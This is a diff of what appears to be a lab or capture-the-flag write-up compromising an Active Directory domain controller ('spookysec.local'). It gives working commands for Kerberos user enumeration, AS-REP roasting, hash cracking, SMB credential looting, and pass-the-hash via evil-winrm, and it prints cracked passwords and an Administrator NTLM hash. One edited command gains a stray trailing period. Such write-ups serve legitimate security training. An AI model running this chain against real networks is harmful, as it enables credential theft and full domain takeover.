@@ -48,7 +48,6 @@ The assessment initiated with zero prior knowledge of the internal network topol
 bash
 # Executing targeted infrastructure scan
 nmap -sC -sV -p 53,88,135,139,389,445,3268 -oN primary_dc_audit.log 10.10.x.x
-Use code with caution.
 Identified Infrastructure Indicators:
 • Port 88 (Kerberos v5): Validated active directory-based authentication framework.
 • Ports 139 / 445 (SMB): Confirmed active network transport for remote file systems.
@@ -56,14 +55,12 @@ Identified Infrastructure Indicators:
 Local name resolution configuration was established to ensure correct routing protocols for all subsequent domain queries:
 bash
 echo "10.10.x.x spookysec.local" >> /etc/hosts
-Use code with caution.
 
 Phase 2: Active Directory Account Harvesting
 
 Leveraging the open Kerberos architecture, the target environment was queried to validate existing usernames. Because the Kerberos protocol implicitly reveals identity validity through differential error responses during pre-authentication requests, an automated username verification brute-force was executed against standard enterprise name lists.
 bash
 kerbrute userenum --dc spookysec.local -d spookysec.local core_corporate_users.txt
-Use code with caution.
 Discovered High-Value Accounts:
 • svc-admin (Implying an administrative service role)
 • backup (Implying infrastructure or database backup capabilities)
@@ -74,12 +71,10 @@ A thorough configuration review of the discovered identities revealed that the s
 This setting allows an attacker to request an authentication ticket (AS-REP) from the Key Distribution Center (KDC) without proving knowledge of the associated password. The KDC signs the ticket using the account's master password hash, permitting offline cracking attempts.
 bash
 # Requesting the encrypted AS-REP material
-python3 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -format hashcat
-Use code with caution.
+python3 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -format hashcat.
 The resulting cipher text block ($krb5asrep$23$) was isolated and fed into an optimized cryptographic processing array for dictionary-based decryption:
 bash
 hashcat -m 18200 svc_admin_tgs.hash enterprise_wordlist.txt --force
-Use code with caution.
 • Recovered Plaintext Value: management2005
 • Operational Outcome: Established an initial low-privileged authenticated foothold inside the internal domain boundaries.
 
@@ -88,15 +83,12 @@ Phase 4: Sensitive Data Exposure Assessment
 With the newly obtained authenticated context of svc-admin, a comprehensive access audit of the Server Message Block (SMB) deployment was conducted to map accessible data storage tiers.
 bash
 smbclient -L //spookysec.local/ -U svc-admin
-Use code with caution.
 The query exposed a non-default network directory resource structurally defined as \backup. Upon executing an administrative mount of the directory, a text-based storage asset containing cleartext parameters was discovered:
 bash
 smbclient //spookysec.local/backup -U svc-admin -C "get backup_credentials.txt"
-Use code with caution.
 The asset stored a Base64 encoded byte array. Reversing the encoding layer exposed functional configuration parameters designed for automated backup scripts:
 bash
 echo "YmFja3VwQHNwb29reXNlYy5sb2NhbCA6IGJhY2t1cDI1MTc4NjA=" | base64 -d
-Use code with caution.
 • Compromised Identity: backup@spookysec.local
 • Recovered Plaintext Value: backup2517860
 
@@ -110,14 +102,12 @@ Use code with caution.
 The Domain Controller executed the replication request, dumping the core cryptographic NTLM validation string for the built-in Domain Administrator:
 text
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
-Use code with caution.
 
 Phase 6: Lateral Pivot & Full Identity Domination
 
 Rather than devoting operational time to reverse the complex NTLM structure of the Administrator account, a Pass-the-Hash (PtH) methodology was employed. Because the Windows Remote Management (WinRM) interface natively accepts valid NTLM hashes for session establishment, the compromised hash token was passed directly over Port 5985.
 bash
 evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
-Use code with caution.
 Final Strategic State:
 The execution successfully instantiated an interactive command console running under the NT AUTHORITY\SYSTEM context on the root Domain Controller, confirming absolute operational control over all identity, cryptographic verification, and host resources within the enterprise forest.
 
